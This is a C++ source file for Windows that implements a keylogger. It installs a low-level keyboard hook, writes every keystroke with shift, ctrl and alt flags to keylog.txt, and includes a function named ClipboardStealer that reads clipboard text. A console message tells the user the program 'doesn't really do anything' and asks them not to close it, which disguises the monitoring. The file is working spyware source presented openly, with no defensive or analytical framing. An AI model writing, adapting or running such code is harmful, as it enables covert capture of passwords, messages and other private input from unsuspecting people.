// Author: Ahmad Azeez

#include <Windows.h>
#include <iostream>
#include <fstream>

struct LogKey
{
    char key;
    bool isShift, isControl, isAlt;
};

std::ofstream file;
LogKey currentKey;
bool isRunning = false;

void LogKeyPress(char key, bool isShift, bool isControl, bool isAlt);
void SaveLog();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void ClipboardStealer();

int main()
{
    file.open("keylog.txt", std::ios::binary | std::ios::app);

    if (!file.is_open())
    {
        std::cerr << "Failed to open the log file.\n";
        return 1;
    }

    // Setting up a low-level keyboard hook
    // Ref to the installed hook in the windows hook chain
    HHOOK hhk; // Creating my own hook
    hhk = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (hhk == NULL)
    {
        std::cerr << "Failed to set up keyboard hooks.\n";
        return 1; // 1 for error and to terminate the program
    }

    isRunning = true;

    std::cout << "This program doesn't really do anything, so you can ignore it, don't close it tho, thanks ;)" << std::endl;

    ClipboardStealer();

    // Basically the main message loop
    while (isRunning)
    {
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    // Uninstall the hooks
    UnhookWindowsHookEx(hhk);

    // Close the file when done
    file.close();

    return 0;
}

// Hook procedure for low-level keyboard events
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* keyData = (KBDLLHOOKSTRUCT*) lParam;

        if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
        {
            char key = static_cast<char>(keyData->vkCode);

            // 0x8000 if pressed, 0x0000 if not
            bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool isControl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
            bool isAlt = (GetKeyState(VK_MENU) & 0x8000) != 0;

            LogKeyPress(key, isShift, isControl, isAlt);

            SaveLog();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void LogKeyPress(char key, bool isShift, bool isControl, bool isAlt)
{
    currentKey.key = key;
    currentKey.isShift = isShift;
    currentKey.isControl = isControl;
    currentKey.isAlt = isAlt;
}

void SaveLog()
{
    if (file.is_open())
    {
        file << currentKey.key << (currentKey.isShift ? "shift\n" : "") << (currentKey.isControl ? "ctrl\n" : "") << (currentKey.isAlt ? "alt\n" : "") << '\n';

        file.flush(); // Making sure contents are written to file immediately
    }
}

void ClipboardStealer()
{
    // NULL is for opening the clipboard associated with the current thread
    if (OpenClipboard(NULL))
    {
        HANDLE hData = GetClipboardData(CF_TEXT);

        if (hData)
        {
            // Returns a pointer to the handle
            char* pData = (char*)GlobalLock(hData);

            if (pData)
            {
                std::cout << "Clipboard Data: " << pData << std::endl;
                GlobalUnlock(hData);
            }
        }

        CloseClipboard();
    }
}
